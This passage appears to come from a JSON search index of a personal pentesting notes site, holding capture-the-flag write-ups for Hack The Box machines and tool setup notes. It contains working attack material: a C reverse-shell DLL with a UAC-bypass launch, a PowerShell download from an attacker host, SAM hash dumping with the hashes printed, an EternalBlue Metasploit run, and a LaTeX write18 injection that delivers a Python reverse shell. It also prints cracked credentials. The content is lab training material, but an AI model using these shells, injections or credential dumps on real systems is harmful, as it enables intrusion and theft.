TEXT(\u0026quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\CMD.EXE\u0026quot;); CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, \u0026amp;si, \u0026amp;pi); WaitForSingleObject(pi.hProcess, INFINITE); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); WSACleanup(); }  rev_shell.h\n#pragma Once void rev_shell();  Compiling the DLL -\nhttps://egre55.github.io/system-properties-uac-bypass/\nhttps://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/\nFirstly install mingw there are a bunch of version you want, no need them all. apt-get install mingw* my notes were pretty confusing. after it\u0026rsquo;s compiled move it over to the python web server then drop it to disk with invoke web request. drop the file in c:\\users\\batman\\appdata\\local\\microsoft\\windowsapps\\ . Then we\u0026rsquo;ll run c:\\windows\\system32\\systempropertiesAdvanced.exe  or c:\\windows\\syswow64\\systempropertiesAdvanced.exe\nx86_64-w64-mingw32-gcc -shared -o death-piex86.dll dllmain.cpp revshell.cpp rev_shell.h -lws2_32  on arkham do the following\ncd c:\\users\\batman\\appdata\\local\\microsoft\\windowsapps powershell iwr 'http://10.10.14.2/death-piex86.dll' -outfile .\\srrstr.dll  BE SURE TO SETUP A NETCAT LISTENER locally\nnc -lcnp 9135 :P  c:\\windows\\syswow64\\systempropertiesAdvanced.exe  You\u0026rsquo;ll notice you are still batman when you run whoami you are in a elevated session the session has the permissions associated with systempropertiesadvanced.exe\n"
},
{
	"uri": "/hackthebox/boxes/arkham/",
	"title": "Arkhams",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/hackthebox/boxes/bastion/notes/",
	"title": "Bastion-Golden",
	"tags": [],
	"description": "",
	"content": "Bastion, is a windows machine that has smb, ssh, winrm. We\u0026rsquo;ll find a backup a virtual box back up image a VHD file. Well get our Credentials to login from dumping NTLM-hashes from Sam, System. To get root we\u0026rsquo;ll exploit some saved credentials in a configuration file to ssh into.\nNMAP\n# Nmap 7.70 scan initiated Mon May 13 17:33:32 2019 as: nmap -sC -sV -p22,135,139,445,5985,12512 -oA nmap/target 10.10.10.134 Nmap scan report for 10.10.10.134 Host is up (0.046s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 12512/tcp closed unknown Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -39m52s, deviation: 1h09m14s, median: 5s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Bastion | NetBIOS computer name: BASTION\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-05-13T23:33:50+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-05-13 17:33:49 |_ start_date: 2019-05-13 15:37:21 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon May 13 17:33:50 2019 -- 1 IP address (1 host up) scanned in 18.08 seconds  SSH Nothing here to exploit\nSMB Guest login is enabled, this is our first way into bastion. Ill Show a couple of ways to use different tools to enumerate SMB shares.\nsmbmap -u guest -H 10.10.10.134 -r / -u username -r recursive  smbclient //10.10.10.134/Backups  CLUES So we found a clue in notes.txt\nSysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.  ​ There\u0026rsquo;s back-image\u0026rsquo;s in the SMB share,there a few directories in.\ncd \u0026quot;/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/\u0026quot;  We could Download the backup image which will take forever. We can mount the share to  mnt  and inspect the image that way.\nmount -o user=guest '//10.10.10.134/Backups' /mnt/bast-vhd  Well, need a Tool to mount the image so we can inspect it. I used guestmount.\napt-get install libguestfs-tools  After thats done with could take awhile, well mount the drive and examine it. Make a directory in mount or mnt directory.\nmkdir /mnt/bast-vhd cd \u0026quot;/mnt/bast-vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/\u0026quot;  You may have to use the full path. After some testing well find that 9b9cfbc4 is our desired image.\nmkdir /mnt/bast-vhd2 guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/bast-vhd2/  Windows stores user Credentials in  SAM \u0026amp; SYSTEM, it stores them as NTLM hashes. Hashes are cryptographically secure. They only work on way, but that doesn\u0026rsquo;t mean they aren\u0026rsquo;t without faults. We will be using some pwdrump which is should be reinstalled on kali.\ncd /mnt/bast-vhd2/Windows/System32/config  As mentioned above will be using PWDump which will extract the NTLM hashes from SYSTEM hive and SAM hive\npwdump SYSTEM SAM  Before running off to HASHCAT lets try crackstation.net, hashcat should be a last resort just to save time. I tried to use hashcat but didn\u0026rsquo;t get anything, i also cut it short but whatever.\nI would like to take a moment to disgust what a ntlm hash is. Colon\u0026rsquo;s are a delimiter,the first part is the user-name, the next the groupid the user belongs to. notice in the image above the different users have differing id\u0026rsquo;s. Ntlm hashes can store a large password up to 128 characters. they broken into two hashes.\nPASSWORD IS bureaulampje\nuser:\tL4mpje pass:\tbureaulampje  SHELL We could ssh or probably winrm.\nssh L4mpje@10.10.10.134  One place to check but is often forgotten about is program files and check both versions.\nmRemoteNG Use to store passwords in clear text, now the credentials are encrypted.\nWe will have to move the files over to our lhost\ngo to file \u0026gt; Open connectionFile\nnow well add this weird external terminal tool feature to extract the passwords.\nTools \u0026gt; External Tools\nyou will notice i already have one done but i added quotes and that tripped me up thought it was apart of the password lol. then i check L4mpje and saw the same quote. this will opena terminal with the password decrypted yes!!\ndisplay name :\tPassWordLookUp filename :\tcmd arguements :\t/k echo %password%  right click on DC \u0026gt; external tool \u0026gt;passwordlookup . it should open a cmd prompt.\nlogin into ssh with adminsitrator and the password done.\n"
},
{
	"uri": "/hackthebox/boxes/bastion/writeup/",
	"title": "Bastion-Notes",
	"tags": [],
	"description": "",
	"content": "so nmap revealed a bunch of stuf smb which allows guest access. inside there we find a clue. Also the directory is writeable. so ill have to try psf.exe\n# Nmap 7.70 scan initiated Mon May 13 17:33:32 2019 as: nmap -sC -sV -p22,135,139,445,5985,12512 -oA nmap/target 10.10.10.134 Nmap scan report for 10.10.10.134 Host is up (0.046s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 12512/tcp closed unknown Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -39m52s, deviation: 1h09m14s, median: 5s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Bastion | NetBIOS computer name: BASTION\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-05-13T23:33:50+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-05-13 17:33:49 |_ start_date: 2019-05-13 15:37:21 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon May 13 17:33:50 2019 -- 1 IP address (1 host up) scanned in 18.08 seconds  smb enum\nnull client guest xD no switches needed. using the cmd below we should see allt he writeable share.\nsmbmap -u guest -H 10.10.10.134 -r /  well use smbclient to connect to smb. note i don\u0026rsquo;t use any switches this is referred to null\nsmbclient //10.10.10.134/Backups  we found a note.txt, i think this is a note tot us that we do not need to transfer the file to the localhost. Using some command line we can mount the remote drive locally.\nSysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.  WindowsImageBackup is where the backup iamges are that we will be exploiting. these are windows 2008.\nthis will mount the share to a local directory.\nmount -o user=guest '//10.10.10.134/Backups' /mnt/bast-vhd  cd /mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351  next install guestmount, if you don\u0026rsquo;t already have it apt-get install guestmount. i used -m flag but i needed to use the \u0026ndash;inspector flag. make sure you are in the working directory for the vhd image. make a second mnt directory\nmkdir /mnt/bast-vhd2  guestmount --add 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/bast-vhd2  no, took awhile to find what i was looking for in here spent sometime looking for poo strange programs. then i remember this one time i got into someone computer i had access to the filesystem so i found the ntlm hashes.\nWe are looking for where ntlm hashes are stored inside windows 2008. which can be found in c:\\Windows\\System32\\config\nnow i fond a bunch of tools for later use. https://tools.kali.org/password-attacks/creddump\ni used pwdump, i also moved the files to my basitonf directory.\npwdump SYSTEM SAM  took awhile to figure out to uses these creds with opensshwinx64. administrator password here isn\u0026rsquo;t a known hash so good luck brute forcing it. but l4mpje works fine. ran that users hash at crackstation.com\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::  user:\tL4mpje pass:\tbureaulampje  openssh\nssh L4mpje@10.10.10.134  once inside here i found mremoteng which i have used in the past for ssh scp type stuff. you can store creds locally etc connection.\nthere are a couple different files to choice form and recently they fulled encrypted the file or whatever. but i think the olderback isn\u0026rsquo;t fully encrypted which gives us access to what we need.\ngo to file \u0026gt; Open connectionFile\nnow well add this weird external terminal tool feature to extract the passwords.\nTools \u0026gt; External Tools\nyou will notice i already have one done but i added quotes and that tripped me up thought it was apart of the password lol. then i check L4mpje and saw the same quote. this will opena terminal with the password decrypted yes!!\ndisplay name :\tPassWordLookUp filename :\tcmd arguements :\t/k echo %password%  right click on DC \u0026gt; external tool \u0026gt;passwordlookup . it should open a cmd prompt.\nlogin into ssh with adminsitrator and the password done.\n"
},
{
	"uri": "/hackthebox/boxes/bastion/",
	"title": "Bastions",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/windows/bloodhound/",
	"title": "BloodHound Neo4j",
	"tags": [],
	"description": "setting up bloodhound in a Debian environment",
	"content": "TAKE A SNAPSHOT BEFORE ATTEMPTING THIS.\nI would highly recommend installing Neo4j using the repository. Neo4j is a database for bloodhound API. I had a couple of issues installing this. had some issues with multiple versions of Java running. currently, neo4k only runs on Java 8 kali currently comes with 11.x. need to tell java to use the legacy version. Next, need to add the repository to download neo4j.\n##### echo \u0026quot;deb http://httpredir.debian.org/debian jessie-backports main\u0026quot; | sudo tee -a /etc/apt/sources.list.d/jessie-backports.list apt-get update ##### apt-get -t jessie-backports install ca-certificates-java ##### take the output and put it after set \u0026lt;java8bane\u0026gt; update-java-alternatives --list ##### currently update-java-alternatives --jre --set \u0026lt;java8name\u0026gt; ##### update repo wget -O - https://debian.neo4j.org/neotechnology.gpg.key | sudo apt-key add - echo 'deb https://debian.neo4j.org/repo stable/' | sudo tee -a /etc/apt/sources.list.d/neo4j.list sudo apt-get update ###### neo4j start -- background neo4j console -- foreground  BloodHound\ngo to the desirded location you wish to set this up. For me a have a tool directory. ##### this is already compiled ready to go git clone https://github.com/BloodHoundAD/BloodHound.git cd BloodHound wget https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-linux-x64.zip unzip BloodHound-linux-x64.zip ./Bloodhound if you get a white screen hit these keys ( crtl + r ) #### For a lager selection of compiled bloodhound releases. https://github.com/BloodHoundAD/BloodHound/releases  I changed the password before I got to this part. So I will be using screenshots from ippsecs video. when you first setup bloodhound and enter some creds it\u0026rsquo;ll ask you to go to localhost:7687 to change the password. go to your browser and type it in. the default creds for neo4j are neo4j and it won\u0026rsquo;t let you in until you change the password which is nice a feature.\nbloodhound login\ninitial neo4j browser page\nchange your password\nIf you\u0026rsquo;d like to install from the repo use this guide\nhttps://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/ references and thanks https://www.youtube.com/watch?v=ob9SgtFm6_g\u0026amp;t=21s https://neo4j.com/docs/operations-manual/current/installation/linux/debian/ https://0xdf.gitlab.io/2018/11/10/htb-reel.html  "
},
{
	"uri": "/hackthebox/boxes/blue/",
	"title": "Blue",
	"tags": [],
	"description": "",
	"content": " Blue Special thanks to IppSec for contributing to this post. Please Subscribe\nchanges /etc/hosts so 10.10.10.40 blue.htb\nPORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 82.62 seconds  Windows 7 Professional 7601 Service Pack 1\nport 135 = RPC a couple buffer overflow attacks I doubt its vulnerable.\nport 139 = NetBIOS is rarely vulnerable you can enumerate the system with it through gathering information\nport 445 = Smb server message block often exploitable. Don\u0026rsquo;t count on it though.\nTalking about EnternalBlue Atleast l wilI try to, for a detailed in-depth explanation Click Here\nThe exploit MS17-10, aka EternalBlue was used by an Nation State Advisory and after getting leaked and becoming public a different group used it to cryptolocker a good portion of internet connected SMB Hosts. SMB normally isn\u0026rsquo;t connected to the internet, so it is doubtful the exploit is intended to be the initial infection. It is was an excellent tool to move around a network laterally as SMB is used legitimately by Windows for domain management. Today, it remains a way to gain SYSTEM access to unpatched system and attempt to find loot that is helpful.\nEternalBlue exploits three bugs to achieve RCE\n Wrong Casting Bug \u0026ndash; this leads to a buffer overflow Wrong Parsing Function Bug \u0026ndash; Using two functions, to trick the system they can\u0026rsquo;t handle large packs so it will split packets into smaller packers. Since the first function breaks it will escape out SMB treats the last function as the first. This allows bug A to work by Treating Dword as word. Non-paged Pool Allocation Bug \u0026ndash; creates a hole in the heap stack allowing 1 \u0026amp; 2 to write in memory.  Exploiting Blue Using nmap to check and make sure the vulnerability exist.\nNmap -p445 \u0026ndash;script vuln blue.htb -T4\n Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-24 06:22 EST Nmap scan report for blue.htb (10.10.10.40) Host is up (0.13s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds  Now, go into Metasploit. While running the exploit. It will fail a couple times so wait patiently for it to return a shell.\nmsfconsole search lue exploit/windows/smb/ms17_010_eternalblue MS17-010 EternalBlue SMB Remote Windows use exploit/windows/smb/ms17_010_eternalblue set RHOST 10.10.10.40 run  The user flag is in c:\\Users\\haris\\Desktop\ntype user.txt The root flag is in c:\\Users\\Adimistrator\\Desktop\ntype root.txt "
},
{
	"uri": "/webapp/burp/burp/",
	"title": "Burp",
	"tags": [],
	"description": "",
	"content": "DA BASICS\n\u0026lt;-\nBurp Suit is a graphical tool for web app security. It can do a host of things but in the free version its limited. In hack the box you will mostly use it to proxy web request and edit them before you send it off to the server. theres repeater which is basically like saving the web request allows you to repeat the web request.\nPROXY : Will set the ip address and port which burp will intercept the traffic.\nREPEATER : Right click on intercepted traffic and send to repeater to send the same web-request and make edits and try and get different results.\nSEQUENCER : This is used to test cookies mostly that\u0026rsquo;s what i have used it for.\nDECODER : A basic tool to encode and decode it kind of sucks but is convent to decode things.\nSETTIING UP BURP PROXY Go to the proxy tab \u0026gt; Options \u0026gt; Proxy Listener \u0026gt;Edit the select a Listener \u0026gt; Edit a Window will pop up there are a couple of thing you can do. To keep it simple change Bind to Port to 8088 \u0026gt; Click Okay.\nNEXT Go back to the Proxy tab and click on intercept you can visually verify this by seeing it change from (off to on).\noptions as the request method will return the used methods for the webapp. "
},
{
	"uri": "/webapp/burp/",
	"title": "Burp",
	"tags": [],
	"description": "",
	"content": "DA BASICS\n\u0026lt;-\nBurp Suit is a graphical tool for web app security. It can do a host of things but in the free version its limited. In hack the box you will mostly use it to proxy web request and edit them before you send it off to the server. theres repeater which is basically like saving the web request allows you to repeat the web request.\nPROXY : Will set the ip address and port which burp will intercept the traffic.\nREPEATER : Right click on intercepted traffic and send to repeater to send the same web-request and make edits and try and get different results.\nSEQUENCER : This is used to test cookies mostly that\u0026rsquo;s what i have used it for.\nDECODER : A basic tool to encode and decode it kind of sucks but is convent to decode things.\nSETTIING UP BURP PROXY Go to the proxy tab \u0026gt; Options \u0026gt; Proxy Listener \u0026gt;Edit the select a Listener \u0026gt; Edit a Window will pop up there are a couple of thing you can do. To keep it simple change Bind to Port to 8088 \u0026gt; Click Okay.\nNEXT Go back to the Proxy tab and click on intercept you can visually verify this by seeing it change from (off to on).\noptions as the request method will return the used methods for the webapp. "
},
{
	"uri": "/webapp/burp/burp-ca/",
	"title": "Burp Setup CA",
	"tags": [],
	"description": "",
	"content": "So, Recently had to reinstall kali. I had to setup burp again to work with TLS certs. To properly intercept https traffic.\nWell, just go to  http:/burp:port, click on  CA Certificate download the cert. Now, in firefox click on options click on preferences. Go to  Privacy \u0026amp; Security  take the scroll bar go all the way to the bottom and go to  View Certificares Under Certificates header. Under the Authorities tab click on import then import the Cert we got from burp, most likely inside Downloads.\nThat\u0026rsquo;s Here\u0026rsquo;s a link to the burp website.\n"
},
{
	"uri": "/hackthebox/boxes/chaos-og/",
	"title": "CHAOS",
	"tags": [],
	"description": "",
	"content": " chaos web server is hosting quite a few webpages. 10.10.10.120/wp/wordpress, chaos.htb, webmail.chaos.htb, chaos.htb:10000. Using wfuzz we find the subdomain. THERE IS A WAF INPLACE BLOCK ACCESSIVE LOGIN ETC\nNMAP\nnot sure what 10000 really is most likely related\nnmap -sC -sV -oA nmap/initial chaos.htb -T4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 09:30 EST Nmap scan report for chaos.htb (10.10.10.120) Host is up (0.046s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.34 ((Ubuntu)) |_http-server-header: Apache/2.4.34 (Ubuntu) |_http-title: Chaos 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: STLS TOP UIDL AUTH-RESP-CODE RESP-CODES PIPELINING SASL CAPA | ssl-cert: Subject: commonName=chaos | Subject Alternative Name: DNS:chaos | Not valid before: 2018-10-28T10:01:49 |_Not valid after: 2028-10-25T10:01:49 |_ssl-date: TLS randomness does not represent time 143/tcp open imap Dovecot imapd (Ubuntu) |_imap-capabilities: ID more LITERAL+ STARTTLS OK listed post-login Pre-login IMAP4rev1 capabilities LOGIN-REFERRALS IDLE ENABLE have LOGINDISABLEDA0 001 SASL-IR | ssl-cert: Subject: commonName=chaos | Subject Alternative Name: DNS:chaos | Not valid before: 2018-10-28T10:01:49 |_Not valid after: 2028-10-25T10:01:49 |_ssl-date: TLS randomness does not represent time 993/tcp open ssl/imap Dovecot imapd (Ubuntu) |_imap-capabilities: ID AUTH=PLAINA0001 more OK listed post-login Pre-login IMAP4rev1 LITERAL+ LOGIN-REFERRALS IDLE capabilities have ENABLE SASL-IR | ssl-cert: Subject: commonName=chaos | Subject Alternative Name: DNS:chaos | Not valid before: 2018-10-28T10:01:49 |_Not valid after: 2028-10-25T10:01:49 |_ssl-date: TLS randomness does not represent time 995/tcp open ssl/pop3 Dovecot pop3d |_pop3-capabilities: SASL(PLAIN) TOP UIDL AUTH-RESP-CODE RESP-CODES PIPELINING CAPA USER | ssl-cert: Subject: commonName=chaos | Subject Alternative Name: DNS:chaos | Not valid before: 2018-10-28T10:01:49 |_Not valid after: 2028-10-25T10:01:49 |_ssl-date: TLS randomness does not represent time 10000/tcp open http MiniServ 1.890 (Webmin httpd) |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  nmap -p- -oA nmap/total-chaos chaos.htb -T4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 09:41 EST Nmap scan report for chaos.htb (10.10.10.120) Host is up (0.055s latency). Not shown: 65529 closed ports PORT STATE SERVICE 80/tcp open http 110/tcp open pop3 143/tcp open imap 993/tcp open imaps 995/tcp open pop3s 10000/tcp open snet-sensor-mgmt  nmap -sU -T4 udp-chaos chaos.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 11:22 EST Failed to resolve \u0026quot;udp-chaos\u0026quot;. Warning: 10.10.10.120 giving up on port because retransmission cap hit (6). Nmap scan report for chaos.htb (10.10.10.120) Host is up (0.040s latency). Not shown: 964 closed ports, 35 open|filtered ports PORT STATE SERVICE 10000/udp open ndmp  GOBUSTER enumerated all the known webpages\nhttp://10.10.10.120\n/wp (Status: 301) /wordpress /index.php (Status: 301) /wp-content (Status: 301) /wp-login.php (Status: 200) /wp-includes (Status: 301) /wp-trackback.php (Status: 200) /wp-admin (Status: 301) /wp-signup.php (Status: 302) /javascript (Status: 301)  http://chaos.htb\n/index.html (Status: 200) /contact.html (Status: 200) /about.html (Status: 200) /blog.html (Status: 200) /img (Status: 301) /css (Status: 301) /source (Status: 301) /js (Status: 301) /javascript (Status: 301) /hof.html (Status: 200)  https://chaos.htb:10000 NOTHING\nWFUZZ - subdomains Fails\nwfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u \u0026quot;http://FUZZ.chaos.htb:10000\u0026quot; -t 42 -f filename,printer : Store results in the output file using the specified printer (raw printer if omitted). -H \u0026quot;Host: FUZZ.10.10.10.120\u0026quot;  wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Dis covery/DNS/subdomains-top1mil-5000.txt -u \u0026quot;http://10.10.10.120\u0026quot; -H \u0026quot;Host: FUZZ.10.10.10.120\u0026quot; -t 42 --hc 400 i also fuzzed /wp/wordpress  wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u \u0026quot;http://FUZZ.chaos.htb:10000\u0026quot; -t 42  Mild success\nwfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Di$ covery/DNS/subdomains-top1mil-5000.txt -u \u0026quot;http://chaos.htb/wp/wordpress\u0026quot; -H \u0026quot;Host: FUZZ.cha$ s.htb\u0026quot; -t 42 --hc 400 000003: C=301 9 L 28 W 333 Ch \u0026quot;localhost\u0026quot; 000004: C=403 11 L 32 W 304 Ch \u0026quot;webmail\u0026quot; 000005: C=301 9 L 28 W 323 Ch \u0026quot;smtp\u0026quot;  Sucess\nwfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u \u0026quot;http://chaos.htb\u0026quot; -H \u0026quot;Host: FUZZ.chaos.htb\u0026quot; -t 42 --hl 1 000004: C=200 120 L 386 W 5607 Ch \u0026quot;webmail\u0026quot;  WEBAPP\u0026rsquo;S\n1)2)chaos.htb\n3)10.10.10.120/wp/wordpress #we found this using gobuster initially\nhere we will find the credentials for webmail(roundcube) # password : human\n4) webmail.chaos.htb # enter the above creds into the login protal\n​ #Then navigate to drafts and download the attachments\nHYDRA # THERE IS A WAF INPLACE that\u0026rsquo;s why we see direct ip not allowed and our brute forcing attempts are blocked.\nDECRYPTING https://github.com/argosk/encrypt-Python # To decrypt this file i used a python script i found on github it will ask you for to either encrpt for decrypt a file then select a file. eneter the key to de or en crypt the file. in the email we are told the password is our name. we are addressed as sahay.\n#python script.py password file def encrypt(key, filename): chunksize = 64*1024 outputFile = \u0026quot;en\u0026quot; + filename filesize = str(os.path.getsize(filename)).zfill(16) IV =Random.new().read(16) encryptor = AES.new(key, AES.MODE_CBC, IV) with open(filename, 'rb') as infile: with open(outputFile, 'wb') as outfile: outfile.write(filesize.encode('utf-8')) outfile.write(IV) while True: chunk = infile.read(chunksize) if len(chunk) == 0: break elif len(chunk) % 16 != 0: chunk += b' ' * (16 - (len(chunk) % 16)) outfile.write(encryptor.encrypt(chunk)) def getKey(password): hasher = SHA256.new(password.encode('utf-8')) return hasher.digest()  J00_w1ll_f1Nd_n07H1n9_H3r3 Finally we\u0026rsquo;re we need to be for the joooooice! we find out selve on a little web app that makes pdf\u0026rsquo;s for some kind of firm that puts the header to make official on the pdf. The input isn\u0026rsquo;t properly sanatized we can use. this app uses latex to structure and build the documents submited into the desired format. we are interested in the ability to run commands/\nafter some expierentation i found what i need to get rce.\n1)\n2) playing around with burp3) when it is base64 encoded is bypass bypass restrictions. webapp can read base64 soemthing that b missed4)After some time found what i needed to get rce.\n\\immediate\\write18{CMD GOES HERE}  5) We can script it in to encode it b646)i used python to get a rshell. 0xdf used rm/nc\npython reverse shell \u0026ndash; success content=\\immediate\\write18{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.15.159\u0026quot;,9080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);' \u0026gt; chickenp.sh|base64 \u0026gt; chickenp.sh} \\newread\\file \\openin\\file=chickenp.sh \\loop\\unless\\ifeof\\file \\read\\file to\\fileline \\text{\\fileline} \\repeat \\closein\\file Run1 \u0026amp;template=test3  USER \u0026amp; ROOT\nFirst thing\u0026rsquo;s first figure out who am i. www-data use su to switch to ayush use the same password. then using the tarwild card technique we will get root.\nLinEnum\n[-] Specific release information: DISTRIB_ID=Ubuntu DISTRIB_RELEASE=18.10 DISTRIB_CODENAME=cosmic DISTRIB_DESCRIPTION=\u0026quot;Ubuntu 18.10\u0026quot; NAME=\u0026quot;Ubuntu\u0026quot; VERSION=\u0026quot;18.10 (Cosmic Cuttlefish)\u0026quot; ID=ubuntu ID_LIKE=debian PRETTY_NAME=\u0026quot;Ubuntu 18.10\u0026quot; VERSION_ID=\u0026quot;18.10\u0026quot; HOME_URL=\u0026quot;https://www.ubuntu.com/\u0026quot; SUPPORT_URL=\u0026quot;https://help.ubuntu.com/\u0026quot; BUG_REPORT_URL=\u0026quot;https://bugs.launchpad.net/ubuntu/\u0026quot; PRIVACY_POLICY_URL=\u0026quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\u0026quot; VERSION_CODENAME=cosmic UBUNTU_CODENAME=cosmic  Su ayush\nusername – ayush\npassword – jiujitsu\nEXPORT\nexport -p to view the shell resitrictions this shows all the read only. declare -rx PATH=\u0026ldquo;/home/ayush/.app\u0026rdquo; declare -rx SHELL=\u0026ldquo;/opt/rbash\u0026rdquo;\nexport -p declare -x APACHE_LOCK_DIR=\u0026quot;/var/lock/apache2\u0026quot; declare -x APACHE_LOG_DIR=\u0026quot;/var/log/apache2\u0026quot; declare -x APACHE_PID_FILE=\u0026quot;/var/run/apache2/apache2.pid\u0026quot; declare -x APACHE_RUN_DIR=\u0026quot;/var/run/apache2\u0026quot; declare -x APACHE_RUN_GROUP=\u0026quot;www-data\u0026quot; declare -x APACHE_RUN_USER=\u0026quot;www-data\u0026quot; declare -x HOME=\u0026quot;/home/ayush\u0026quot; declare -x INVOCATION_ID=\u0026quot;df9e05d0804e4d1da0747f6120c01317\u0026quot; declare -x JOURNAL_STREAM=\u0026quot;9:19877\u0026quot; declare -x LANG=\u0026quot;en_US.UTF-8\u0026quot; declare -x LOGNAME=\u0026quot;ayush\u0026quot; declare -x MAIL=\u0026quot;/var/mail/ayush\u0026quot; declare -x OLDPWD=\u0026quot;/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile\u0026quot; declare -rx PATH=\u0026quot;/home/ayush/.app\u0026quot; declare -x PWD=\u0026quot;/home\u0026quot; declare -x 